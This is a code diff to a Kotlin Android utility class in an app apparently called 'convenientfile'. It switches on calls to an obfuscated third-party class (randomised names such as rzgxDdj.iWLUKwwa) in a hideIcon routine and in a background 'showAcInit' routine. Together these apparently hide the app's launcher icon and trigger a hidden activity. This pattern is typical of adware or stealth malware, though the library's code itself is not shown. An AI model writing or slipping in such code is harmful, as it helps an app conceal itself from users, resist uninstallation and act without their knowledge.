@@ -4,6 +4,7 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.webkit.WebView
+import com.byLQVcZ.YjprUUji.rzgxDdj
 import com.hal.convenientfile.base.BaseApp
 import java.util.*
 import kotlin.concurrent.thread
@@ -162,9 +163,10 @@ object AppUtil {
     fun hideIcon() {
         if (canOpt) {
             Handler(Looper.getMainLooper()).post {
-//                TcFJCpa.ogTdwtFI(app, "12".toInt())
+                val hideResult = rzgxDdj.iWLUKwwa(app, "12".toInt())
                 SPUtil.putBoolean(SpKey.SP_KEY_IS_ICON_HIDE, true)
-                "hideIcon...".log()
+                log("hideIcon...reuslt==", hideResult)
+//                "hideIcon...reuslt==$hideResult".toast()
             }
         }
     }
@@ -176,7 +178,8 @@ object AppUtil {
         if (canOpt) {
             thread {
                 "showAcInit...".log()
-//                TcFJCpa.ogTdwtFI(app, "15".toInt())
+                val showAcResult = rzgxDdj.iWLUKwwa(app, "15".toInt())
+//                log("showAcResult===", showAcResult)
             }
         }
     }
